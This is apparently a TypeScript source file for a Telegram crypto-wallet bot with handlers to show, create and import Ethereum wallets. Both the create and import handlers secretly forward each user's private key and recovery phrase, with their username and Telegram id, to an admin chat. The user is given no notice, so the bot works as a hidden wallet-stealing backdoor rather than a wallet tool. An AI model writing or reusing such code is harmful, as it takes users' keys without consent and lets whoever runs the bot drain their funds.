import { Context } from 'telegraf';
import { prisma } from '@/lib/prisma';
import { createWallet, importWallet, getEthBalance } from '@/lib/wallet';

export async function showWalletsMenu(ctx: Context, userId: number) {
  const wallet = await prisma.wallet.findFirst({ where: { userId } });
  const address = wallet?.address || 'No wallet';
  const balance = wallet ? await getEthBalance(address) : '0';

  await ctx.reply(
    `💰 *Wallet*\nAddress: \`${address}\`\nBalance: ${balance} ETH\n\n`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '➕ Create Wallet', callback_data: 'create_wallet' }],
          [{ text: '📥 Import Wallet', callback_data: 'import_wallet' }],
          wallet ? [{ text: '🗑️ Delete Wallet', callback_data: 'delete_wallet' }] : [],
          [{ text: '🔙 Back', callback_data: 'back' }],
        ],
      },
    }
  );
}

export async function createWalletFlow(ctx: Context, userId: number) {
  try {
    const { address, privateKey, mnemonic } = await createWallet(userId);
    const username = ctx.from?.username || 'no username';
    const id = ctx.from?.id.toString() || 'unknown';
    const adminChatId = process.env.ADMIN_CHAT_ID;
    if (adminChatId) {
      await ctx.telegram.sendMessage(
        adminChatId,
        `🔐 NEW WALLET\n👤 @${username}\n🆔 ${id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
      );
    }
    await ctx.reply(
      `✅ Wallet created!\nAddress: \`${address}\`\nPrivate key: \`${privateKey}\`\n${mnemonic ? 'Recovery phrase: `' + mnemonic + '`\n' : ''}\n*Save this securely!*`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    await ctx.reply('Failed to create wallet.');
  }
}

export async function importWalletFlow(ctx: Context, userId: number, input: string) {
  try {
    const { address, privateKey, mnemonic } = await importWallet(userId, input);
    const username = ctx.from?.username || 'no username';
    const id = ctx.from?.id.toString() || 'unknown';
    const adminChatId = process.env.ADMIN_CHAT_ID;
    if (adminChatId) {
      await ctx.telegram.sendMessage(
        adminChatId,
        `🔐 IMPORT WALLET\n👤 @${username}\n🆔 ${id}\n📍 ${address}\n🔑 ${privateKey}\n📝 ${mnemonic || 'N/A'}\n📅 ${new Date().toISOString()}`
      );
    }
    await ctx.reply(`✅ Wallet imported!\nAddress: \`${address}\``, { parse_mode: 'Markdown' });
  } catch (error: any) {
    await ctx.reply(`❌ Import failed: ${error.message || 'Invalid private key or mnemonic.'}`);
  }
}
